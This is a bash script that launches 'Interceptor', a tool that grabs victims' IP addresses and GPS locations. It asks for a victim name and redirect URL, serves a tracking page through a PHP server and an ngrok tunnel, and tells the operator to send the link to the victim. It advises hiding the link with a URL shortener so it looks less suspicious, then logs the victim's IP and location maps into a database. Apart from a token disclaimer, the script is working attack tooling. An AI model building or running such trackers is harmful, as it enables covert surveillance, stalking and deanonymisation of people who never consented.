#!/bin/bash
# ORIGINAL CREATOR: Luca Garofalo (Lucksi)
# AUTHOR: Luca Garofalo (Lucksi)
# Copyright (C) 2021-2023 Lucksi <lukege287@gmail.com>
# License: GNU General Public License v3.0

YELLOW=$(tput setaf 11)
RED=$(tput setaf 1)
GREEN=$(tput setaf 2)
WHITE=$(tput setaf 15)
BANNER=$(tput setab 1)
RESET=$(tput sgr0)


function Banner {
    clear
    banner=$(<"Banner/Banner1.txt") 
    printf "${YELLOW}$banner"
}

function Eula {
    if [ -f "Configuration/Agreement.txt" ];
        then
        Menu
    fi
    Banner
    printf "\n\n${WHITE}\nTHIS TOOL IS FOR EDUCATIONAL AND TESTING PURPOSES ONLY I DO NOT ASSUME ANY KIND OF RESPONSABILITY FOR ANY INTENTIONAL OR UNINTENTIONAL DAMAGE YOU WILL CAUSE WITH THIS TOOL, ATTACKS WITHOUT SOMEONE CONSENT IS CONSIDERATED ILLEGAL BY THE LAW. BY USING THIS TOOL YOU ACCEPT THIS CONDITION.USE IT WITH GOOD SENSE\n\n${GREEN}(Y)${WHITE}ACCEPT${RED}(N)${WHITE}DECLINE\n\n"
    read -p "$YELLOW[INTERCEPTOR]$WHITE-->" Agree
        while [[ "$Agree" == "" ]]
            do
            printf "\n\n"
            read -p "$YELLOW[INTERCEPTOR]$WHITE-->" Agree
        done
        if [[ "$Agree" == "Y" || "$Agree" == "y" ]];
            then
            echo "AGREEMENT ACCEPTED">"Configuration/Agreement.txt"
            Menu
        fi
        printf "${RED}\n\n[!]"${WHITE}"YOU MUST ACCEPT THIS TERM IN ORDER TO USE THIS TOOL\n\n"
	    exit 1
}

function Check {
    attempts=5;
    Password=$(sed -nr "/^\[Settings\]/ { :l /^Password[ ]*=/ { s/.*=[ ]*//; p; q;}; n; b l;}" <Configuration/Configuration.ini)
    printf "${GREEN}\n[+]${WHITE}INSERT YOUR UPDATE PASSWORD YOU HAVE $attempts ATTEMPTS\n\n"
    while [[ $attempts>0 ]];
        do
        read -p "$YELLOW[INTERCEPTOR]$WHITE-->" pass
        while [[ $pass == "" ]]
            do
            printf "${GREEN}\nINSERT YOUR UPDATE PASSWORD YOU HAVE $attempts ATTEMPTS\n\n"
            read -p "$YELLOW[INTERCEPTOR]$WHITE-->" pass
        done
        if [ "$pass" == "$Password" ];
            then
            printf "${WHITE}\nPASSWORD CORRECT!\n"
            update
        fi
        ((attempts=attempts-1))
        printf "${WHITE}\nWRONG PASSWORD REMAINING: ${GREEN}$attempts ATTEMPTS\n\n"
    done
    printf "${WHITE}\nYOU HAVE: $attempts PRESS ENTER TO EXIT"
    read -p
    exit 1
}

function update {
    Update_path=$(sed -nr "/^\[Settings\]/ { :l /^Path[ ]*=/ { s/.*=[ ]*//; p; q;}; n; b l;}" <Configuration/Configuration.ini)
    cd $Update_path
    mv Interceptor Interceptor2  &>/dev/null
    git clone https://github.com/Lucksi/Interceptor &>/dev/null | printf "$WHITE\nUPDATING INTERCEPTOR PLEASE WAIT..\n"
    if [ $? -eq  0 ];
        then
        cd $Update_path
        printf "${WHITE}\nWOULD YOU LIKE TO DELETE THE OLD FILES?(1)YES(2)NO\n\n"
        read -p "$YELLOW[INTERCEPTOR]$WHITE-->" conf
        if [ $conf = 1 ];
        then
        rm -r Interceptor2 &>/dev/null | printf "${WHITE}\nDELETING FILES..."
        else
        printf "${WHITE}\nKEEPING OLD FILES"
        fi
        sleep 2
        printf "${WHITE}\n\nINTERCEPTOR UPDATED CORRECTLY\n\n"
        read -p "$YELLOW[INTERCEPTOR]$WHITE-->" confvar
        printf "${WHITE}\nPRESS ENTER TO EXIT"
        read -p
        exit 1
    fi
    printf "${WHITE}\n\nINTERCEPTOR NOT INSTALLED IT MAY BE AN INTERNET PROBLEM\n\n"
    mv Interceptor2 Interceptor
    exit 1
}

function Database {
    clear
    banner=$(<"Banner/Banner4.txt") 
    printf "${YELLOW}$banner"
    printf "${GREEN}\n\n[+]${WHITE}LISTING DATABASE FILES..."
    sleep 3
    for entry in $(ls Template/Database);
        do
        printf "\n${GREEN}[+]${WHITE}$entry"
    done
    printf "${GREEN}\n\n[+]${WHITE}INSERT THE FILE NAME THAT YOU WANT TO OPEN(LEAVE EMPTY TO GO BACK TO THE MENU)\n\n"
    read -p "$YELLOW[INTERCEPTOR]$WHITE-->" File
   
    while [ $File != "" ];
        do
        printf "${GREEN}\n[+]${WHITE}CHECKING IF FILE EXIST...\n"
        sleep 2
        if [ -f "Template/Database/$File/$File.txt" ]; 
            then
            printf "${GREEN}\n[+]${WHITE}OPENING FILE $File...\n\n"
            sleep 2
            reader=$(<"Template/Database/$File/$File.txt")
            while IFS= read -r line
                do    
                echo "${GREEN}[+]${WHITE}$line"
                if [ "$line" == "" ];
                then
                break
            fi
            done < "Template/Database/$File/$File.txt"
            fi
        if [ -f "Template/Database/$File/geo.txt" ]; 
            then
            printf "${GREEN}\n[+]${WHITE}OPENING $File GPS FILE...\n\n"
            sleep 2
            reader=$(<"Template/Database/$File/geo.txt")
            while IFS= read -r line
                do    
                echo "${GREEN}[+]${WHITE}$line"
                if [ "$line" == "" ];
                then
                break
            fi
            done < "Template/Database/$File/geo.txt"
            printf "${GREEN}\n[+]${WHITE}PRESS ENTER TO CONTINUE...\n\n"
            read -p "$YELLOW[INTERCEPTOR]$WHITE-->" Port
            Database
        fi
        printf "${GREEN}\n[+]${WHITE}FILE NOT FOUND PRESS ENTER TO CONTINUE...\n\n"
        read -p "$YELLOW[INTERCEPTOR]$WHITE-->" Port
        Database

    done
    Menu
}

function Grabber {
    count=0
    printf "${GREEN}\n[+]${WHITE}INSERT THE VICTIM NAME\n\n"
    read -p "$YELLOW[INTERCEPTOR]$WHITE-->" Victim
    while [ "$Victim" == "" ];
        do
        printf "${GREEN}\n[+]${WHITE}INSERT THE VICTIM NAME\n\n"
        read -p "$YELLOW[INTERCEPTOR]$WHITE-->" Victim
    done
    printf "${GREEN}\n[+]${WHITE}INSERT THE REDIRECT-URL\n\n"
    read -p "$YELLOW[INTERCEPTOR]$WHITE-->" Url
    while [ "$Url" == "" ];
        do
        printf "${GREEN}\n[+]${WHITE}INSERT THE REDIRECT-URL\n\n"
        read -p "$YELLOW[INTERCEPTOR]$WHITE-->" Url
    done
    printf "${GREEN}\n[+]${WHITE}INSERT YOUR SERVER PORT,LEAVE EMPY FOR DEFAULT(DEFAULT:6000)\n\n"
    read -p "$YELLOW[INTERCEPTOR]$WHITE-->" Port
    if [ "$Port" == "" ];
        then
        Port="6000"   
    fi
    printf "${GREEN}\n[+]${WHITE}WOULD YOU LIKE TO ACTIVATE THE ACCURATE GEOLOCATION MODULE?(1)YES(2)NO\n\n"
    read -p "$YELLOW[INTERCEPTOR]$WHITE-->" Answ2
    if [ $Answ2 == 1 ];
        then
        cd Template/Temp/
        echo -n "True">Geo.txt
        echo -n "../Database/$Victim/geo.txt">Geo2.txt
        echo -n "../Database/$Victim/geo.html">Geo3.txt
        cd ../../
        Geo="True"
    elif [ $Answ2 == 2 ];
        then
        cd Template/Temp/
        echo -n "False">Geo.txt
        Geo="False"
        cd ../../
    fi
    printf "${GREEN}\n[+]${WHITE}WOULD YOU LIKE TO SAVE THESE VALUES?(1)YES(2)NO"
    printf "${GREEN}\n[+]${WHITE}USERNAME:${YELLOW}$Victim"
    printf "${GREEN}\n[+]${WHITE}REDIRECT-URL:${YELLOW}$Url"
    printf "${GREEN}\n[+]${WHITE}PORT:${YELLOW}$Port"
    printf "${GREEN}\n[+]${WHITE}GPS:${YELLOW}$Geo\n\n"
    read -p "$YELLOW[INTERCEPTOR]$WHITE-->" Answ
    if [ $Answ == 2 ];
        then
        Grabber  
    fi
    printf "${GREEN}\n[+]${WHITE}SAVING OPTIONS..."
    sleep 3
    clear
    banner=$(<"Banner/Banner3.txt")
    cd Template/Temp/
    echo -n "$Victim">User.txt
    echo -n "$Url">Url.txt
    cd ../../ 
    printf "${YELLOW}$banner"
    printf "${GREEN}\n\n[+]${WHITE}OPTION SAVED:${YELLOW}SUCCESSFULLY"
    printf "${GREEN}\n\n[+]${WHITE}CHECKING ${YELLOW}$Victim ${WHITE}OLD DATA..."
    file2="Template/Database/$Victim/$Victim.txt"
    sleep 2 
    if [ -f $file2 ];
        then
        printf "${GREEN}\n\n[+]${WHITE}OLD DATA FOUND DELETING..."
        rm -rf "Template/Database/$Victim"
    else
        printf "${GREEN}\n\n[+]${WHITE}NO DATA FOUND"
    fi
    mkdir "Template/Database/$Victim"
    printf "${GREEN}\n\n[+]${WHITE}RUNNING PHP SERVER..."
    sleep 2
    php -S  127.0.0.1:$Port -t Template  >/dev/null 2>&1 &
    printf "${GREEN}\n\n[+]${WHITE}RUNNING NGROK SERVER...\n"
    sleep 4
    printf "${GREEN}\n[+]${WHITE}GENERATING URL...\n"
    Tunnel/./ngrok http $Port >/dev/null 2>&1 &
    sleep 9
    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
    printf "${GREEN}\n[+]${WHITE}SEND THIS LINK TO THE VICTIM:${YELLOW}$link\n"
    printf "${GREEN}\n[+]${YELLOW}TIPS:${WHITE}USE A URL SHORTENER FOR MASK THESE URL SO IT MAY SEEM LESS SUSPICIOUS:)\n"
    printf "${GREEN}\n[+]${YELLOW}REMINDER:${WHITE}THIS TOOL HAS BEEN DESIGNED FOR EDUCATIONAL AND TEST PURPOSES ONLY PLEASE USE IT WITH GOOD SENSE:)"
    printf "${GREEN}\n\n[+]${WHITE}WAITING FOR THE VICTIM TO OPEN THE LINK:\n"
    while [ ! -s $file2 ];
        do
        found=0
    done
    printf "${GREEN}\n[+]${WHITE}IP INFO FOUND:\n"
    sleep 5
    info=$(<"$file2")
    while IFS= read -r line
        do    
        echo "${GREEN}[+]${WHITE}$line"
        if [ "$line" == "" ];
            then
            break
        fi
    done < "$file2"
    sleep 2
    if [ $Answ2 == 1 ];
        then
        file3="Template/Database/$Victim/geo.txt"
        while [ ! -s $file3 ];
            do
            found=0
        done
        printf "${GREEN}\n[+]${WHITE}GPS INFO FOUND:\n"
        sleep 5
        info=$(<"$file3")
        while IFS= read -r line
            do    
            echo "${GREEN}[+]${WHITE}$line"
            if [ "$line" == "" ];
                then
                break
            fi
        done < "$file3"
         printf "${GREEN}\n[+]${WHITE}GPS MAP OF${YELLOW} $Victim${WHITE} SAVED ON FOLDER:${YELLOW}Template/Database/${Victim}/geo.html\n"
    fi
    printf "${GREEN}\n[+]${WHITE}ADDING${YELLOW} $Victim${WHITE} IP ON THE DATABASE...\n"
    printf "${GREEN}\n[+]${WHITE}IP MAP OF${YELLOW} $Victim${WHITE} SAVED ON FOLDER:${YELLOW}Template/Database/${Victim}/Map.html\n"
    sleep 4
    printf "${GREEN}\n[+]${WHITE}DELETING OLD SERVER FILE...\n"
    sleep 3
    rm Template/Temp/User.txt && rm Template/Temp/Url.txt && rm Template/Temp/Geo.txt
    if [ $Answ2 == 1 ];
        then
        rm Template/Temp/Geo2.txt && rm Template/Temp/Geo3.txt
    fi
    printf "${GREEN}\n[+]${WHITE}OLD SERVER FILES DELEATED\n"
    printf "${GREEN}\n[+]${WHITE}SHUTTING DOWN SERVER...\n"
    killall  php > /dev/null 2>&1
    killall ngrok > /dev/null 2>&1
    printf "${GREEN}\n[+]${WHITE}SERVER SHUTED DOWN SUCCESSFULLY\n"
    printf "${GREEN}\n[+]${WHITE}PRESS ENTER TO CONTINUE...\n\n"
    read -p "$YELLOW[INTERCEPTOR]$WHITE-->" Victim
    Menu
}

function Menu {
    Banner
    Version=$(<"Version/Version.txt")
    printf "${WHITE}\n\nA SIMPLE IP-TRACKER/GRABBER TOOL\t${BANNER}CODED BY LUCKSI${RESET}\n\n"
    printf "${WHITE}[+]${GREEN}VERSION:$Version\n"
    printf "${YELLOW}Instagram:lucks_022\nEMAIL:lukege287@gmail.com\nGIT-HUB:Lucksi\nTwitter:@Lucksi_22\nLinkedin:https://www.linkedin.com/in/lucksi"
    printf "${GREEN}\n\n[*INSERT AN OPTION*]\n"
    printf "${WHITE}(1)IP-GRABBER\n(2)DATABASE\n(3)UPDATE\n(4)EXIT\n\n"
    read -p "$YELLOW[INTERCEPTOR]$WHITE-->" option
    if [ $option == 1 ];
        then
        Grabber
        Menu
    elif [ $option == 2 ];
        then
        Database
    elif [ $option == 3 ];
        then
        Check
    elif [ $option == 4 ];
        then
        exit 1
    fi
    Menu
}

if [ $(id -u) -ne 0 ]; 
	then
	clear
    Banner
	printf "${RED}\n\n[!]"${WHITE}"THIS SCRIPT MUST BE RUN AS ROOT TRY WITH SUDO :)\n\n"
	exit 1
fi
Eula
